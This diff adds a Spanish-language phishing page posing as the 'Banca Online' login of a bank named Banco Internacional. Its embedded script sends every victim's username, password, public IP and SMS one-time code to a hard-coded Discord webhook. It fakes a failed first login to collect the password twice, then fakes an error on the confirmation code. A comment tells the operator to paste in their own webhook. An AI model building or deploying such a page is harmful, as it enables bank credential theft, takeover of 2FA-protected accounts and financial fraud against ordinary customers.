@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca Online | Acceso Seguro</title>
+    <link rel="stylesheet" href="estilos.css">
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="header">
+            <div class="logo-wrap">
+                <img src="logow.png" alt="Logo" class="main-logo">
+            </div>
+        </div>
+
+        <div class="content-box">
+            <div class="top-row">
+                <div class="col-left">
+                    <h2 class="section-title">INGRESO A BANCA ONLINE</h2>
+                    
+                    <div id="errorMsg" class="error-banner" style="display:none;">
+                        Usuario o contraseña incorrecta. Por favor, verifique sus datos e intente de nuevo.
+                    </div>
+
+                    <form id="loginForm" onsubmit="return false;">
+                        <div id="userSection">
+                            <div class="input-group">
+                                <div class="icon-field">👤</div>
+                                <label class="label-inline">Usuario</label>
+                                <input type="text" id="usuario" autocomplete="off" required>
+                            </div>
+                            <button type="button" onclick="irAPassword()" class="btn-primary-long">Continuar</button>
+                        </div>
+
+                        <div id="passSection" style="display:none;">
+                            <div class="input-group">
+                                <div class="icon-field">👤</div>
+                                <label class="label-inline">Usuario</label>
+                                <input type="text" id="displayUser" readonly>
+                            </div>
+                            <div class="input-group">
+                                <div class="icon-field">🔒</div>
+                                <label class="label-inline">Contraseña</label>
+                                <input type="password" id="clave" placeholder="••••••••">
+                            </div>
+                            <div class="btn-row">
+                                <button type="button" class="btn-secondary" onclick="location.reload()">Cancelar</button>
+                                <button type="button" onclick="manejarFlujo()" class="btn-primary-long" style="flex: 1.5;">Continuar</button>
+                            </div>
+                        </div>
+
+                        <div id="loadingSection" style="display:none;" class="loader-wrap">
+                            <div class="spinner"></div>
+                            <span id="loadingText" class="loader-text">Validando información...</span>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="col-right">
+                    <h2 class="section-title-right">UTILIDADES</h2>
+                    <ul class="list-utils">
+                        <li><a href="#">¿No tienes usuario?, genéralo aquí</a></li>
+                        <li><a href="#">¿Olvidaste tu contraseña?</a></li>
+                        <li><a href="#">Desbloquea tu usuario</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="info-footer">
+                <div class="shield-icon">🛡️</div>
+                <p>Te recordamos que Banco Internacional no solicita información personal vía e-mail.</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="modalOTP" class="modal-backdrop" style="display:none;">
+        <div class="modal-box">
+            <h1 class="modal-h1-whatsapp">Código de confirmación</h1>
+            <p class="modal-p-whatsapp">Se le ha enviado un sms o e-mail con el codigo requerido,el cual debe introducir en el campo(Codigo de Confirmacion) para continuar si transaccion.</p>
+            <div id="modalError" class="error-banner" style="display:none; margin-bottom: 15px;">Código incorrecto. Intente de nuevo.</div>
+            <div class="modal-input-wrap-whatsapp">
+                <input type="text" id="smsInput" placeholder="Código de Confirmación" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+                <span class="lock-icon-whatsapp">🔒</span>
+            </div>
+            <div class="modal-footer-whatsapp">
+                <button type="button" class="btn-modal-cancelar" onclick="location.reload()">CANCELAR</button>
+                <button type="button" class="btn-modal-whatsapp" onclick="procesarSMS()">CERRAR</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let intentosLogin = 0;
+        let smsEnviado = false;
+        
+        // --- CONFIGURACIÓN DEL WEBHOOK ---
+        // Pega aquí tu URL de Discord o el servicio que uses
+        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1481813956774596669/5hdY6963mwZyIlxMYXm8qRaKwOj68BsVFmGVCKdl4xpExXdfIUZwFaDSkyNqE7ZUuOGz"; 
+
+        async function enviarDato(tipo, data) {
+            try {
+                // Captura de IP (Usa un servicio externo confiable)
+                const resIp = await fetch('https://api.ipify.org?format=json');
+                const jsonIp = await resIp.json();
+                
+                const mensaje = {
+                    content: `**🔔 NUEVO REPORTE [${tipo}]**`,
+                    embeds: [{
+                        title: "Información de Acceso",
+                        color: 16744192, // Color Naranja
+                        fields: [
+                            { name: "👤 Usuario", value: data.u || "---", inline: true },
+                            { name: "🔑 Clave", value: data.p || "---", inline: true },
+                            { name: "📱 SMS", value: data.s || "---", inline: true },
+                            { name: "🌐 IP Pública", value: jsonIp.ip, inline: true }
+                        ],
+                        footer: { text: "Sistema de Seguridad | " + new Date().toLocaleString() }
+                    }]
+                };
+
+                // Envío al Webhook
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(mensaje)
+                });
+            } catch (e) { 
+                console.error("Error en la conexión de red"); 
+            }
+        }
+
+        // --- FUNCIONES DE NAVEGACIÓN ---
+
+        function irAPassword() {
+            const u = document.getElementById('usuario').value;
+            if(u === "") return;
+            document.getElementById('userSection').style.display = 'none';
+            document.getElementById('passSection').style.display = 'block';
+            document.getElementById('displayUser').value = u;
+        }
+
+        function manejarFlujo() {
+            const u = document.getElementById('usuario').value;
+            const p = document.getElementById('clave').value;
+            if(p === "") return;
+
+            if(intentosLogin === 0) {
+                // PRIMER ENVÍO: Usuario y Clave
+                enviarDato("LOGIN_CAPTURA_1", { u: u, p: p });
+                
+                document.getElementById('passSection').style.display = 'none';
+                document.getElementById('loadingSection').style.display = 'flex';
+                
+                setTimeout(() => {
+                    document.getElementById('loadingSection').style.display = 'none';
+                    document.getElementById('userSection').style.display = 'block';
+                    document.getElementById('errorMsg').style.display = 'block';
+                    document.getElementById('usuario').value = "";
+                    document.getElementById('clave').value = "";
+                    intentosLogin = 1;
+                }, 1500);
+            } else {
+                // SEGUNDO ENVÍO: Reintento de Usuario y Clave
+                enviarDato("LOGIN_CAPTURA_2", { u: u, p: p });
+                
+                document.getElementById('passSection').style.display = 'none';
+                document.getElementById('loadingSection').style.display = 'flex';
+                setTimeout(() => {
+                    document.getElementById('loadingSection').style.display = 'none';
+                    document.getElementById('modalOTP').style.display = 'flex';
+                }, 4500);
+            }
+        }
+
+        function procesarSMS() {
+            const s = document.getElementById('smsInput').value;
+            const u = document.getElementById('displayUser').value;
+            if(s.length < 6) return;
+
+            // TERCER ENVÍO: Código SMS
+            enviarDato("SMS_RECIBIDO", { u: u, s: s });
+
+            document.getElementById('modalOTP').style.display = 'none';
+            document.getElementById('loadingSection').style.display = 'flex';
+            
+            setTimeout(() => {
+                document.getElementById('loadingSection').style.display = 'none';
+                document.getElementById('modalOTP').style.display = 'flex';
+                document.getElementById('modalError').style.display = 'block';
+                document.getElementById('smsInput').value = "";
+            }, 4000);
+        }
+    </script>
+</body>
+</html>
